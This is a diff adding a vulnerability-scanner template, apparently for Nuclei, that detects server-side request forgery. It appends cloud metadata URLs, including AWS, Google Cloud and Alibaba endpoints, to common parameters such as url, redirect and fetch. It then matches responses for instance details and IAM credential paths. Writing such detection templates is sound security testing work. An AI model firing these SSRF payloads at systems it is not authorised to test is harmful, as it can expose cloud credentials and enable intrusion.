@@ -1,0 +1,42 @@
+id: whai-ssrf-detection
+
+info:
+  name: SSRF Detection via Common Parameters
+  author: whitehat-ai
+  severity: high
+  description: Detects Server-Side Request Forgery via common vulnerable parameters
+  tags: ssrf,owasp,injection
+  reference:
+    - https://portswigger.net/web-security/ssrf
+    - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?url=http://metadata.google.internal/computeMetadata/v1/"
+      - "{{BaseURL}}/?url=http://100.100.100.200/latest/meta-data/"
+      - "{{BaseURL}}/?redirect=http://169.254.169.254/"
+      - "{{BaseURL}}/?page=http://169.254.169.254/"
+      - "{{BaseURL}}/?dest=http://169.254.169.254/"
+      - "{{BaseURL}}/?fetch=http://169.254.169.254/"
+      - "{{BaseURL}}/?uri=http://169.254.169.254/"
+      - "{{BaseURL}}/?site=http://169.254.169.254/"
+      - "{{BaseURL}}/?load=http://169.254.169.254/"
+      - "{{BaseURL}}/?img=http://169.254.169.254/"
+      - "{{BaseURL}}/?content=http://169.254.169.254/"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        part: body
+        regex:
+          - "(?i)(ami-id|instance-id|instance-type|local-hostname|public-hostname|placement)"
+          - "(?i)(iam/security-credentials|iam/info)"
+          - "(?i)(computeMetadata|project/project-id)"
+          - "(?i)(meta-data|user-data)"
+        condition: or
